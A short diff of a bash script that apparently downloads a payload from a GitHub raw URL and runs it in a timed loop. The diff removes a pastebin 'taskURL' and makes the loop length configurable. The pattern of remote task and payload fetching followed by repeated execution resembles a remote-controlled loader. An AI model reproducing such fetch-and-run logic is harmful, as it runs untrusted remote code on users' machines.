@@ -10,7 +10,7 @@ payloadPrefix="https://raw.githubusercontent.com/thiesgehrmann/"
 
 ###################################################################
  # Configuration variables
-taskURL="https://pastebin.com/raw/PPUdAf1s"
+rootLoopTime=60
 
 localTaskData="$SCRIPTDIR/taskdata"
 localPayloadFile="$SCRIPTDIR/payload"
@@ -151,7 +151,7 @@ if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
     downloadPayloadIfNeeded
   
     timeStart=`date '+%s'`
-    while [ $((`date '+%s'` - timeStart)) -lt 15 ]; do
+    while [ $((`date '+%s'` - timeStart)) -lt $rootLoopTime ]; do
       echo "Root: Running payload"
       runPayload
       sleep 1
